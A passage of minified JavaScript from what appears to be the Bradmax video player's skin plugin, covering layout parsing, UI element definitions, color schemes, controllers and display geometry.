Kd=Mb++;if(c.item(Kd).getAttribute("id")==m.field(qc.skinIcons,"id")){Ub=!0;break}}Ub||window.document.head.insertAdjacentHTML("beforeend",m.field(qc.skinIcons,"element")),d.appendChild(this.skinStage.element.instance),na.add(this.context,"repaint",(function(Nb){Rb.delay(Cb,100)})),this.skinStage.create(),H.add(this.context,H.EDIT_COLOR_SCHEME,(function(Nb){b.updateColorTheme(b.context,Nb.data)})),this.destroyPrerenderedFonts(),null!=this.get_variables()&&(1==this.pluginConfig.autoplay?(c=this.get_variables(),c=!Object.prototype.hasOwnProperty.call(c,"autoplay")):c=!1,c&&(this.get_variables().autoplay=!0),0==this.pluginConfig.volume?(c=this.get_variables(),c=!Object.prototype.hasOwnProperty.call(c,"mute")):c=!1,c&&(this.get_variables().mute=!0))},destroy:function(){lb.prototype.destroy.call(this),lc.destroy(this.uid),null!=this.timer&&this.timer.stop(),this.timer=null,this.skinStage.destroy(),mc.destroy(),this.destroyPrerenderedFonts(),qc.skinConfig=null,qc.skinLayout=null,qc.skinStyles=null,this.skinStage=qc.skinIcons=null},activate:function(){lb.prototype.activate.call(this),this.skinStage.activate(),this.skinStage.redrawCall(),this.skinStage.forceRedraw(),Xb.isReadyForCascadingUpdates.h[this.context]=!0},updateColorTheme:function(b,c){for(var d=lc.getColorScheme(b),q=0,X=m.fields(c);q<X.length;){var ra=X[q];++q,d[ra]=m.field(c,ra)}lc.setColorScheme(b,d),this.skinStage.forceRedraw()},prerenderFonts:function(){qc.skinFontPrerenderElements=[];for(var b=[],c=0,d=m.fields(qc.skinStyles);c<d.length;){var q=d[c];++c,-1<q.indexOf("FONT_")&&b.push(q)}for(c=b,d=window.document.createElement("span"),b=0;b<c.length;){var X=c[b];++b,(q=d.cloneNode()).className="Font_prerenderer "+p.string(m.field(qc.skinStyles,X)),q.innerHTML="Bradmax Ltd.",this.get_parentDisplay().appendChild(q),qc.skinFontPrerenderElements.push(q)}},destroyPrerenderedFonts:function(){if(null!=qc.skinFontPrerenderElements)for(var b=0,c=qc.skinFontPrerenderElements;b<c.length;){var d=c[b];++b,this.get_parentDisplay().removeChild(d)}qc.skinFontPrerenderElements=null},getSkinNameFromLayout:function(){if(null!=qc.skinLayout){var b=qc.skinLayout.firstElement();if(b.exists("name"))return b.get("name")}return null},__class__:qc});var Dc=function(){};wa["bs.player.plugin.skin.Font_0f73f475b6be13bab873ca6ce0"]=Dc,Dc.__name__="bs.player.plugin.skin.Font_0f73f475b6be13bab873ca6ce0",Dc.__super__=lc,Dc.prototype=Ja(lc.prototype,{__class__:Dc});var zc=function(b,c,d){this.skinLayout=b,this.skinStyle=c,this.parent=d,this.buildLayout(b.firstElement(),d),this.layoutComplete(d)};wa["bs.player.plugin.skin.LayoutElements"]=zc,zc.__name__="bs.player.plugin.skin.LayoutElements",zc.prototype={skinLayout:null,skinStyle:null,parent:null,clickableLayer:null,titleBox:null,titleLabelContainer:null,titleLabel:null,titleSublabelContainer:null,titleSublabel:null,brandButtonBox:null,brandButton:null,shareBox:null,shareButtonEmbed:null,shareButtonMail:null,shareButtonFacebook:null,shareButtonTwitter:null,shareButtonLinkedIn:null,controlbarBox:null,controlbarContainer:null,playPauseReloadButton:null,controlbarTimeLabel:null,controlbarTimePreSpacer:null,controlbarTimePostSpacer:null,controlbarSlashLabel:null,controlbarDurationLabel:null,controlbarLivePreSpacer:null,controlbarLiveButton:null,controlbarLivePostSpacer:null,controlbarAdLabel:null,progressbarBox:null,progressbarIndicator:null,progressbarSegmentList:null,progressbarMarkerList:null,progressbarTrack:null,progressPopup:null,progressPopupBackgroundTip:null,progressPopupBackground:null,progressPopupThumbnails:null,progressPopupLabel:null,progressPopupExtraLabel:null,pictureInPicturePreSpacer:null,pictureInPictureButton:null,pictureInPicturePostSpacer:null,airPlayPreSpacer:null,airPlayButton:null,airPlayPostSpacer:null,fullscreenButtonPreSpacer:null,fullscreenButton:null,fullscreenButtonPostSpacer:null,chromecastButtonPreSpacer:null,chromecastButton:null,chromecastButtonPostSpacer:null,volumeButtonPreSpacer:null,volumeButton:null,volumeButtonPostSpacer:null,volumePopup:null,volumeTrack:null,volumeProgress:null,volumeIndicator:null,bufferSpinner:null,subtitlePopup:null,subtitleButtonPreSpacer:null,subtitleButton:null,subtitleButtonPostSpacer:null,subtitlePopupItemRenderer:null,subtitleList:null,audioButtonPreSpacer:null,audioButton:null,audioButtonPostSpacer:null,audioPopup:null,audioPopupItemRenderer:null,audioList:null,videoQualityButtonPreSpacer:null,videoQualityButton:null,videoQualityButtonPostSpacer:null,videoQualityPopup:null,videoQualityPopupList:null,videoQualityPopupItemRenderer:null,seriesButtonPreSpacer:null,seriesButton:null,seriesButtonPostSpacer:null,seriesPopup:null,seriesList:null,seriesPopupItemRenderer:null,seriesPopupLeftButton:null,seriesPopupRightButton:null,seriesPopupTitle:null,seriesBufferSpinner:null,channelsButtonPreSpacer:null,channelsButton:null,channelsButtonPostSpacer:null,channelsPopup:null,channelsPopupItemRenderer:null,channelsList:null,messageHolder:null,messageWindow:null,messageClose:null,messageTitle:null,messageTitleBar:null,messageText:null,messageTextDetails:null,messageUserSingleActionButton:null,messageUserSingleActionButtonText:null,advertisementsHolder:null,advertisementsBar:null,advertisementsClick:null,advertisementsLabel:null,advertisementsTime:null,advertisementsCounter:null,advertisementsPlayButton:null,advertisementsMuteButton:null,advertisementsCloseButton:null,advertisementsCloseButtonSpacer:null,splashImageContainer:null,splashImageHolder:null,splashHolder:null,startSplashDefaultPlayButton:null,startSplashDefaultPauseButton:null,endSplashImageContainer:null,endSplashImageHolder:null,endSplashDefaultReloadButton:null,endSplashSocialEmbed:null,endSplashSocialMail:null,endSplashSocialFacebook:null,endSplashSocialTwitter:null,endSplashSocialLinkedIn:null,endSplashCountdownBox:null,EndSplashCountdownContent:null,endSplashCountdownLeft:null,endSplashCountdownImageContainer:null,endSplashCountdownImageHolder:null,endSplashCountdownImageSpinner:null,endSplashCountdownRight:null,endSplashCountdownTitle:null,endSplashCountdownCounter:null,endSplashCountdownButton:null,endSplashTilesBox:null,endSplashTiles:null,endSplashTilesItemRenderer:null,endSplashTilesItemGapRenderer:null,buildLayout:function(b,c){var d=0;for(b=b.elements();b.hasNext();){var q=b.next(),X=this.parseNode(q,d++);null!=X&&(c.addChild(X),this.buildLayout(q,X))}},layoutComplete:function(b){b.layoutComplete();var c=0;for(b=b.children;c<b.length;){var d=b[c];++c,this.layoutComplete(d)}},destroy:function(){var b=fb.getClass(this);b=g.getInstanceFields(b);for(var c=0;c<b.length;){var d=b[c];++c,(d=m.field(this,d))instanceof Xb&&d!=this.parent&&fb.__cast(d,Xb).destroy()}},parseNode:function(b,c){if(!this.isSkinNode(b))return null;var d=b.get("id"),q=b.get("align"),X=b.get("mouseEnable"),ra=b.get("hideWidth"),Aa=b.get("hideHeight"),Qa=this.getNodeInstance(b);if(null==Qa)return null;var Wa=this.getStateForId(d);return this.setSizePosition(Qa,b),Qa.zIndex=c,Qa.parent=this.parent,Qa.set_id(d),Qa.set_states(Wa),Qa.set_align(q),Qa.hideWidth=ra,Qa.hideHeight=Aa,null==Qa.overflowHidden&&(b=b.get("overflowHidden"),Qa.overflowHidden="true"==b||"true"!=b&&Qa.overflowHidden),null!=Qa.elementType&&(Qa.mouseEnable="false"!=X),Qa},getNodeInstance:function(b){var c=b.get("class");if(null!=c)c=g.createInstance(wa[c],[]);else{if(b.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element but found "+(null==b.nodeType?"null":t_toString(b.nodeType)));switch(b.nodeName){case"bs:Box":c=new fc;break;case"bs:Button":c=new rc;break;case"bs:HBox":c=new pe;break;case"bs:Icon":c=new e;break;case"bs:IconButton":c=new ta;break;case"bs:Image":c=new y;break;case"bs:ImageButton":c=new ca;break;case"bs:ItemArray":c=new ya;break;case"bs:ItemHList":c=new Ea;break;case"bs:ItemList":c=new Ha;break;case"bs:ItemListScroll":c=new Ua;break;case"bs:ItemTiles":c=new kb;break;case"bs:Label":c=new Qc;break;case"bs:ResponsiveLabel":c=new ye;break;case"bs:Spacer":c=new k;break;case"bs:Spinner":c=new ea;break;case"bs:Text":c=new ze;break;case"bs:VBox":c=new ae;break;default:c=null}if(c instanceof Qc){if(b.nodeType!=r.Document&&b.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element or Document but found "+(null==b.nodeType?"null":t_toString(b.nodeType)));var d=null;if(null!=b.children[0]){if(b.nodeType!=r.Document&&b.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element or Document but found "+(null==b.nodeType?"null":t_toString(b.nodeType)));if((d=b.children[0]).nodeType==r.Document||d.nodeType==r.Element)throw yb.thrown("Bad node type, unexpected "+(null==d.nodeType?"null":t_toString(d.nodeType)));d=d.nodeValue}null!=d&&fb.__cast(c,Qc).set_text(this.resolveText(d))}}return b.get("id"),this.setRoleAuto(c,b.get("id")),null!=c?c:null},resolveText:function(b){var c=this.parent,d=null;return"{{"==da.substr(b,0,2)&&"}}"==da.substr(b,b.length-2,2)&&(d=da.substr(b,2,b.length-4)),null==d?b:(null!=c.variables.locale&&(Yb.locale=c.variables.locale),null==(c=Yb.translate(d))&&(c=Yb.translate(d)),null!=c?c:b)},setRoleAuto:function(b,c){if(null!=c&&null!=b)for(var d=g.getInstanceFields(fb.getClass(this)),q=0;q<d.length;){var X=d[q];if(++q,X.toLowerCase()==c.toLowerCase())try{m.setProperty(this,X,b)}catch(ra){console.error("ROLE NOT SET: Type mismatch")}}},setSizePosition:function(b,c){for(var d="top left right bottom width height percentWidth percentHeight minWidth maxWidth minHeight maxHeight centerX centerY collapsedHeight expandedHeight".split(" "),q=0;q<d.length;){var X=d[q];++q;var ra=c.get(X);null!=ra&&m.setProperty(b,X,parseFloat(ra))}},isSkinNode:function(b){if(b.nodeType!=r.Element)throw yb.thrown("Bad node type, expected Element but found "+(null==b.nodeType?"null":t_toString(b.nodeType)));var c=b.nodeName;b=b.get("class");for(var d=0,q=Ac.ITEMS_LIST;d<q.length;){var X=q[d];if(++d,X==c)return!0}return null!=b},getStateForId:function(b){return m.getProperty(this.skinStyle,b)},__class__:zc};var Ac=function(){};wa["bs.player.plugin.skin.BSNode"]=Ac,Ac.__name__="bs.player.plugin.skin.BSNode";var mc=function(){};wa["bs.player.plugin.skin.SkinColorScheme"]=mc,mc.__name__="bs.player.plugin.skin.SkinColorScheme",mc.parse=function(b){var c=JSON.parse(b);if(Object.prototype.hasOwnProperty.call(c,"scheme")){mc.scheme=new Jb,mc.schemeBackup=m.field(c,"scheme"),b=0;for(var d=m.fields(mc.schemeBackup);b<d.length;){var q=d[b];++b,mc.scheme.h[q]=m.field(mc.schemeBackup,q)}}if(Object.prototype.hasOwnProperty.call(c,"shades"))for(mc.shades=new Jb,c=m.field(c,"shades"),b=0,d=m.fields(c);b<d.length;)q=d[b],++b,mc.shades.h[q]=m.field(c,q)},mc.updateSchemeWithBase=function(b){if(mc.updateScheme("COLORS_SHADE_MAP_BASE",b),null==mc.shades)return mc.toDynamic();for(var c=Object.keys(mc.shades.h),d=c.length,q=0;q<d;){var X=c[q++],ra=mc.shades.h[X];0==ra?mc.updateScheme(X,b):mc.updateScheme(X,$c.shadeColor(b,ra))}return mc.toDynamic()},mc.updateSchemeWithColors=function(b){for(var c=0,d=m.fields(b);c<d.length;){var q=d[c];++c,mc.updateScheme(q,m.field(b,q))}return mc.toDynamic()},mc.toDynamic=function(){for(var b={},c=Object.keys(mc.scheme.h),d=c.length,q=0;q<d;){var X=c[q++];b[X]=mc.scheme.h[X]}return b},mc.destroy=function(){mc.scheme=null,mc.shades=null,mc.schemeBackup=null},mc.updateScheme=function(b,c){null!=mc.scheme&&Object.prototype.hasOwnProperty.call(mc.scheme.h,b)&&(mc.scheme.h[b]=c)};var he=function(b){P.call(this),this.context=b};wa["bs.player.plugin.skin.SkinControllers"]=he,he.__name__="bs.player.plugin.skin.SkinControllers",he.__super__=P,he.prototype=Ja(P.prototype,{hideShowElementsController:null,clickableLayerController:null,titleController:null,controlbarController:null,playPauseReloadController:null,progressController:null,brandButtonController:null,shareButtonsController:null,fullscreenController:null,chromecastController:null,pictureInPictureController:null,airPlayController:null,volumeController:null,bufferSpinnerController:null,subtitleController:null,videoQualityController:null,audioController:null,seriesController:null,channelsController:null,messageWindowController:null,advertisementsController:null,splashImageController:null,startSplashController:null,endSplashController:null,build:function(b,c){this.clickableLayerController=new jc,this.controlbarController=new ke,this.playPauseReloadController=new Rd,this.progressController=new xd,this.fullscreenController=new le,this.chromecastController=new Qd,this.pictureInPictureController=new Hd,this.airPlayController=new wd,this.volumeController=new yd,this.bufferSpinnerController=new je,this.brandButtonController=new ie,this.titleController=new Td,this.shareButtonsController=new Sd,this.hideShowElementsController=new ed,this.subtitleController=new Vd,this.audioController=new Ud,this.videoQualityController=new fd,this.seriesController=new me,this.channelsController=new Id,this.messageWindowController=new Fd,this.advertisementsController=new Nd,this.splashImageController=new Bd,this.initControllersStartSplash(b),this.initControllersEndSplash(c)},initControllersStartSplash:function(b){this.startSplashController=new ud("play")},initControllersEndSplash:function(b){switch(b){case"countdown":this.endSplashController=new zd(b);break;case"social":this.endSplashController=new Xd(b);break;case"tiles":this.endSplashController=new Ad(b);break;default:this.endSplashController=new Wd}},mapViews:function(b){this.controlbarController.mapView(b.controlbarView),this.playPauseReloadController.mapView(b.playPauseReloadButtonView),this.progressController.mapView(b.progressView),this.pictureInPictureController.mapView(b.pictureInPictureButtonView),this.airPlayController.mapView(b.airPlayButtonView),this.fullscreenController.mapView(b.fullscreenButtonView),this.chromecastController.mapView(b.chromecastButtonView),this.volumeController.mapView(b.volumeView),this.subtitleController.mapView(b.subtitleView),this.videoQualityController.mapView(b.videoQualityView),this.audioController.mapView(b.audioView),this.seriesController.mapView(b.seriesView),this.channelsController.mapView(b.channelsView),this.bufferSpinnerController.mapView(b.bufferSpinnerView),this.titleController.mapView(b.titleView),this.brandButtonController.mapView(b.brandButtonView),this.shareButtonsController.mapView(b.shareButtonsView),this.clickableLayerController.mapView(b.clickableView),this.messageWindowController.mapView(b.messageWindowView),this.advertisementsController.mapView(b.advertisementsView),this.hideShowElementsController.mapView(b.skinShowHideView),this.splashImageController.mapView(b.splashImageView),this.mapStartSplashView(b),this.mapEndSplashView(b)},mapStartSplashView:function(b){this.startSplashController.mapView(b.startSplashView)},mapEndSplashView:function(b){this.endSplashController.mapView(b.endSplashView)},init:function(b){var c=fb.getClass(this);c=g.getInstanceFields(c);for(var d=0;d<c.length;){var q=c[d];++d,(q=m.field(this,q))instanceof zb&&(fb.__cast(q,zb).context=this.context,fb.__cast(q,zb).set_variables(b),fb.__cast(q,zb).init())}},destroy:function(){var b=fb.getClass(this);b=g.getInstanceFields(b);for(var c=0;c<b.length;){var d=b[c];++c,(d=m.field(this,d))instanceof zb&&fb.__cast(d,zb).destroy()}},__class__:he});var id=function(){Y.call(this)};wa["bs.player.plugin.skin.events.EventDispatcher"]=id,id.__name__="bs.player.plugin.skin.events.EventDispatcher",id.__super__=Y,id.prototype=Ja(Y.prototype,{__class__:id});var Zc=function(){this.forceHide=null,this.children=[],this._align="left",this.visible=!0,this._width=this._height=this._percentWidth=this._percentHeight=this._maxWidth=this._minWidth=this._maxHeight=this._minHeight=this._top=this._bottom=this._left=this._right=this._centerX=this._centerY=this.collapsedHeight=this.expandedHeight=null,Y.call(this)};wa["bs.player.plugin.skin.ui.geom.Rectangle"]=Zc,Zc.__name__="bs.player.plugin.skin.ui.geom.Rectangle",Zc.__super__=id,Zc.prototype=Ja(id.prototype,{id:null,x:null,y:null,_width:null,_height:null,_percentWidth:null,_percentHeight:null,_maxWidth:null,_minWidth:null,_maxHeight:null,_minHeight:null,_top:null,_bottom:null,_left:null,_right:null,_centerX:null,_centerY:null,collapsedHeight:null,expandedHeight:null,visible:null,_align:null,scale:null,parent:null,children:null,hideWidth:null,hideHeight:null,forceHide:null,set_id:function(b){return this.id=b},destroy:function(){if(null!=this.children)for(var b=0,c=this.children;b<c.length;){var d=c[b];++b,d.destroy()}null!=this.parent&&this.parent.removeChild(this),this.set_id(null),this._height=this._width=this.y=this.x=null,this.set_width(null),this.set_height(null),this._percentHeight=this._percentWidth=null,this.set_percentWidth(null),this.set_percentHeight(null),this._minHeight=this._maxHeight=this._minWidth=this._maxWidth=null,this.set_maxWidth(null),this.set_minWidth(null),this.set_maxHeight(null),this.set_minHeight(null),this._bottom=this._top=null,this.set_top(null),this.set_bottom(null),this._right=this._left=null,this.set_left(null),this.set_right(null),this._centerY=this._centerX=null,this.set_centerX(null),this.set_centerY(null),this._align=this.visible=this.expandedHeight=this.collapsedHeight=null,this.set_align(null),this.set_scale(null),this.forceHide=this.hideHeight=this.hideWidth=this.children=this.parent=null},addChild:function(b){da.remove(this.children,b),b.context=this.context,b.parent=this,this.children.push(b),this.update()},addChildAt:function(b,c){da.remove(this.children,b),b.context=this.context,b.parent=this,this.children.splice(c,0,b),this.update()},removeChild:function(b){null!=this.children&&da.remove(this.children,b),b.parent=null,this.update()},childrenWidth:function(){for(var b=0,c=0,d=this.children;c<d.length;){var q=d[c];++c,b+=null==q.get_width()||!q.visible||q.forceHide?0:q.get_width()}return b},childrenHeight:function(){if(!(this instanceof ae))return 0;for(var b=0,c=0,d=this.children;c<d.length;){var q=d[c];++c,b+=null==q.get_height()||!q.visible||q.forceHide?0:q.get_height()}return b},calculateHorizontalGap:function(){return 0},calculateVerticalGap:function(){return 0},normalize:function(b){return null==b?0:b},calculateWidth:function(){if(null!=this.get_width())return this.checkWidthMinMax(this.get_width());if(null==this.parent)return null;var b=this.parent.calculateWidth();if(null==b)return null;if(null!=this.get_percentWidth()&&null!=this.parent)return this.checkWidthMinMax((b-this.parent.childrenWidth()-this.parent.calculateHorizontalGap())*this.get_percentWidth());if(null!=this.get_left()&&null!=this.get_right()){var c=this.get_left(),d=this.get_right();return this.checkWidthMinMax(b-(null==c?0:c)-(null==d?0:d))}return null},calculateHeight:function(){if(null!=this.get_height())return this.checkHeightMinMax(this.get_height());if(null==this.parent)return null;var b=this.parent.calculateHeight();if(null==b)return null;if(null!=this.get_percentHeight()&&null!=this.parent)return this.checkHeightMinMax((b-this.parent.childrenHeight()-this.parent.calculateVerticalGap())*this.get_percentHeight());if(null!=this.get_top()&&null!=this.get_bottom()){var c=this.get_top(),d=this.get_bottom();return this.checkHeightMinMax(b-(null==c?0:c)-(null==d?0:d))}return null},calculateX:function(){return null==this.parent?0:null!=this.get_centerX()?(this.parent.calculateWidth()-this.calculateWidth())/2+this.get_centerX():null!=this.get_left()?this.get_left():null==this.get_right()?0:this.parent.calculateWidth()-this.calculateWidth()-this.get_right()},calculateY:function(){return null==this.parent?0:null!=this.get_centerY()?(this.parent.calculateHeight()-this.calculateHeight())/2+this.get_centerY():null!=this.get_top()?this.get_top():null==this.get_bottom()?0:this.parent.calculateHeight()-this.calculateHeight()-this.get_bottom()},getGlobalPosition:function(){if(null==this.parent)return new Vb;var b=this.parent.getGlobalPosition();return b.x+=this.calculateX(),b.y+=this.calculateY(),b},copyAttributes:function(b,c){for(var d="top left right bottom centerX centerY width height percentWidth percentHeight collapsedHeight expandedHeight".split(" "),q=0;q<d.length;){var X=d[q];++q;var ra=m.getProperty(c,X);null!=ra&&m.setProperty(b,X,ra)}},update:function(){},checkHide:function(){var b=!1,c=null,d=null,q=null;return null==this.hideWidth&&""==this.hideWidth||(d=this.checkHideValue(this.hideWidth,pd.skinWidth)),null==this.hideWidth&&""==this.hideHeight||(q=this.checkHideValue(this.hideHeight,pd.skinHeight)),null!=d&&null!=q?c=1==d||1==q:null!=d?c=d:null!=q&&(c=q),null!=c&&this.forceHide!=c&&(this.forceHide=c,b=!0),b},checkHideValue:function(b,c){var d=null;if(null!=b&&""!=b){var q=b.charAt(0);b=parseFloat(da.substr(b,1,null)),"<"==q?d=c<b:">"==q&&(d=c>b)}return d},checkWidthMinMax:function(b){return 0>(b=null!=this.get_minWidth()&&this.get_minWidth()>b?this.get_minWidth():null!=this.get_maxWidth()&&b>this.get_maxWidth()?this.get_maxWidth():b)&&(b=0),b},checkHeightMinMax:function(b){return 0>(b=null!=this.get_minHeight()&&this.get_minHeight()>b?this.get_minHeight():null!=this.get_maxHeight()&&b>this.get_maxHeight()?this.get_maxHeight():b)&&(b=0),b},set_width:function(b){return this._width==b||(0>b&&(b=0),this._width=b,this._percentWidth=null,this.update()),this._width},get_width:function(){return this._width},set_height:function(b){return this._height==b||(0>b&&(b=0),this._height=b,this._percentHeight=null,this.update()),this._height},get_height:function(){return this._height},set_percentWidth:function(b){return 0>b&&(b=0),this._width=null,this._percentWidth=b,this.update(),this._percentWidth},get_percentWidth:function(){return this._percentWidth},set_percentHeight:function(b){return 0>b&&(b=0),this._height=null,this._percentHeight=b,this.update(),this._percentHeight},get_percentHeight:function(){return this._percentHeight},set_minWidth:function(b){return 0>b&&(b=0),this._minWidth=b,this.update(),this._minWidth},get_minWidth:function(){return this._minWidth},set_maxWidth:function(b){return this._maxWidth=b,this.update(),this._maxWidth},get_maxWidth:function(){return this._maxWidth},set_minHeight:function(b){return 0>b&&(b=0),this._minHeight=b,this.update(),this._minHeight},get_minHeight:function(){return this._minHeight},set_maxHeight:function(b){return this._maxHeight=b,this.update(),this._maxHeight},get_maxHeight:function(){return this._maxHeight},set_top:function(b){return this._top=b,this._centerY=this.y=null,this._top},get_top:function(){return this._top},set_bottom:function(b){return this._bottom=b,this._centerY=this.y=null,this.update(),this._bottom},get_bottom:function(){return this._bottom},set_left:function(b){return this._left=b,this._centerX=this.x=null,this._left},get_left:function(){return this._left},set_right:function(b){return this._right=b,this._centerX=this.x=null,this.update(),this._right},get_right:function(){return this._right},set_centerX:function(b){return this._centerX=b,this._right=this._left=this.x=null,this.update(),this._centerX},get_centerX:function(){return this._centerX},set_centerY:function(b){return this._centerY=b,this._bottom=this._top=this.x=null,this.update(),this._centerY},get_centerY:function(){return this._centerY},set_scale:function(b){return this.scale=b,this.update(),this.scale},get_visible_with_redraw:function(){return this.visible},set_visible_with_redraw:function(b){return this.visible==b||(this.visible=b,this.update()),this.visible},set_align:function(b){return this._align=b},get_align:function(){return this._align},layoutComplete:function(){},__class__:Zc,__properties__:{set_scale:"set_scale",set_align:"set_align",get_align:"get_align",set_visible_with_redraw:"set_visible_with_redraw",get_visible_with_redraw:"get_visible_with_redraw",set_centerY:"set_centerY",get_centerY:"get_centerY",set_centerX:"set_centerX",get_centerX:"get_centerX",set_right:"set_right",get_right:"get_right",set_left:"set_left",get_left:"get_left",set_bottom:"set_bottom",get_bottom:"get_bottom",set_top:"set_top",get_top:"get_top",set_minHeight:"set_minHeight",get_minHeight:"get_minHeight",set_maxHeight:"set_maxHeight",get_maxHeight:"get_maxHeight",set_minWidth:"set_minWidth",get_minWidth:"get_minWidth",set_maxWidth:"set_maxWidth",get_maxWidth:"get_maxWidth",set_percentHeight:"set_percentHeight",get_percentHeight:"get_percentHeight",set_percentWidth:"set_percentWidth",get_percentWidth:"get_percentWidth",set_height:"set_height",get_height:"get_height",set_width:"set_width",get_width:"get_width",set_id:"set_id"}});var Xb=function(){this.allowRedraw=!1,this.elementChildren=[],this.elementParent=null,this.elementType=n.BOX,this.element=null,this.drawStateName=["normal"],this.currentStateName=["normal"],this.rotation=null,this.mouseEnable=!0,this.alpha=null,this.states={},this.styles={},Zc.call(this)};wa["bs.player.plugin.skin.ui.core.Display"]=Xb,Xb.__name__="bs.player.plugin.skin.ui.core.Display",Xb.__super__=Zc,Xb.prototype=Ja(Zc.prototype,{displayClass:null,styles:null,states:null,alpha:null,mouseEnable:null,rotation:null,data:null,overflowHidden:null,currentStateName:null,drawStateName:null,zIndex:null,element:null,elementType:null,elementParent:null,elementChildren:null,allowRedraw:null,destroy:function(){this.destroyNativeElement(),Zc.prototype.destroy.call(this)},getChildById:function(b){for(var c=0,d=this.children;c<d.length;){var q=d[c];if(++c,q.id==b)return q}return null},findStageElement:function(){return null==this.parent?this:fb.__cast(this.parent,Xb).findStageElement()},createNativeElement:function(){this.element=new cb,this.eventElement=this.element.create()},buildNativeElement:function(b,c){if(null==c&&(c=!1),null==b&&(b=!0),this.isNativeElementNull()){if(this.createNativeElement(),this.isNativeElementNull())return void console.error("FAIL TO [Display].buildNativeElement(id:"+this.id+") ");null!=this.id&&this.element.instance.classList.add(this.id)}if(null!=this.parent&&this.parent instanceof Xb&&this.appendNativeElement(),b&&null!=this.children&&0<this.children.length)for(var d=0,q=this.children;d<q.length;){var X=q[d];++d,X instanceof Xb&&fb.__cast(X,Xb).buildNativeElement(b,c)}this.reattachEventListeners(),this.setStateName(this.currentStateName),this.redraw()},destroyNativeElement:function(){if(!this.isNativeElementNull()){if(null!=this.children)for(var b=0,c=this.children;b<c.length;){var d=c[b];++b,d instanceof Xb&&fb.__cast(d,Xb).destroyNativeElement()}this.element.destroy()}},getNativeParentChildMap:function(){var b=this.parent;if(b.isNativeElementNull())return null;var c=null,d=0;for(b=b.children;d<b.length;){var q=b[d];++d,q!=this&&q instanceof Xb&&q.isNativeElement()&&q.isNativeElementAttachedToView()&&(null==c&&(c=new Ae),c.h[q.zIndex]=q.element)}return c},isNativeElementNull:function(){return null==this.element||null==this.element.instance},isNativeElement:function(){return null!=this.element&&null!=this.element.instance},isNativeElementAttachedToView:function(){for(var b=this.element.instance;null!=b;){if(9==b.nodeType)return!0;b=b.parentNode}return!1},appendNativeElement:function(){if(!this.isNativeElementNull()){var b=this.parent;if(!b.isNativeElementNull()){var c=b.element;if(c!=this.element.parent)if(0==c.get_children().length)c.appendChild(this.element);else{var d=this.getNativeParentChildMap();if(null!=d){for(var q=-1,X=-1,ra=d.keys();ra.hasNext();){var Aa=ra.next();if(!(this.zIndex>Aa)){X=Aa;break}q=Aa}-1<X?c.insertBefore(this.element,d.h[X]):-1<q?c.appendChild(this.element):(b=b.id+" [before/after index not found to append] \n\t child : ("+p.string(this.elementType)+":"+this.zIndex+":"+this.id+") \n\t afterMapKey : "+q+"  \n\t beforeMapKey : "+X,console.error(b))}else c.appendChild(this.element)}}}},clone:function(){var b=fb.getClass(this);(b=g.createInstance(b,[])).context=this.context,b.parent=this.parent,b.set_id(this.id),b.set_states(null==this.states?{isClean:!1,normal:{isClean:!1},over:{isClean:!1},disabled:{isClean:!1}}:this.states),b.set_align(this.get_align()),b.hideWidth=this.hideWidth,b.hideHeight=this.hideHeight,b.mouseEnable=this.mouseEnable,b.zIndex=this.zIndex,b.overflowHidden=this.overflowHidden,b.rotation=this.rotation,b.alpha=this.alpha,b.displayClass=this.displayClass,this.copyAttributes(b,this);for(var d=0,q=this.children;d<q.length;){var X=q[d];++d,X.elementType!=n.SVG&&b.addChild(fb.__cast(X,Xb).clone())}return b.layoutComplete(),b},generateStyles:function(b){var c={};0<b.length&&"normal"!=b[0]&&(c=this.generateStyles(["normal"]));for(var d=0,q=b.length;d<q;){var X=d++;X=b.slice(0,X+1).join("."),X=m.field(this.states,X);for(var ra=0,Aa=m.fields(X);ra<Aa.length;){var Qa=Aa[ra];++ra,c[Qa]=m.field(X,Qa)}}return this.translateColorAliases(c),c},translateColorAliases:function(b){for(var c,d=0,q=m.fields(b);d<q.length;){var X=q[d];++d,"string"==typeof(c=m.field(b,X))&&0!=c.indexOf("#")&&-1<["color","fontColor","alpha"].indexOf(X)&&(b[X]=lc.getColor(this.context,m.field(b,X)))}},getStyleForStateName:function(b){return null==b?this.styles:this.generateStyles(b)},setStateName:function(b){return this.set_styles(this.generateStyles(b)),this.styles.isClean=!1,this.currentStateName=this.drawStateName=b,this.styles},redraw:function(){if(null!=this.element&&!this.isNativeElementNull()){if(1==Ma.allowGpuRedraw&&Ma.enableGPU(this),null!=this.getStyleForStateName())switch(this.elementType._hx_index){case 0:Ma.redrawDefault(this),Ma.redrawTxt(this);break;case 1:Ma.redrawDefault(this),Ma.redrawBox(this);break;case 2:Ma.checkSvgDirty(this)&&Ma.redrawSvg(this);break;case 3:Ma.redrawImg(this);break;case 4:Ma.redrawDefault(this),Ma.redrawShape(this)}this.checkHide(),this.forceHide&&(Ma.addCssClass(this,"hideElement"),this.isNativeElementNull()||this.element.instance.classList.contains("showElement")&&this.element.instance.classList.remove("showElement"))}},forceRedraw:function(){this.setStateName(this.currentStateName),this.redraw();for(var b,c=0,d=this.children;c<d.length;)b=d[c],++c,b instanceof Xb&&b.forceRedraw()},update:function(){if(this.redraw(),null!=Xb.isReadyForCascadingUpdates.h[this.context]&&null!=this.children)for(var b=0,c=this.children;b<c.length;){var d=c[b];++b,d.update()}},redrawCall:function(){this.update()},set_styles:function(b){return this.styles=b},set_states:function(b){return this.states=b,this.set_styles(this.setStateName(["normal"])),this.states},set_data:function(b){return this.data=b},get_alpha_with_redraw:function(){return this.alpha},set_alpha_with_redraw:function(b){return this.alpha=b,this.redraw(),this.alpha},__class__:Xb,__properties__:Ja(Zc.prototype.__properties__,{set_data:"set_data",set_alpha_with_redraw:"set_alpha_with_redraw",get_alpha_with_redraw:"get_alpha_with_redraw",set_states:"set_states",set_styles:"set_styles"})});var md=function(b,c){Xb.call(this),this.set_id("Skin"),md.instance=this,this.skinLayout=b,this.skinStyle=c,this.set_visible_with_redraw(!1)};wa["bs.player.plugin.skin.SkinStage"]=md,md.__name__="bs.player.plugin.skin.SkinStage",md.getInstance=function(){return 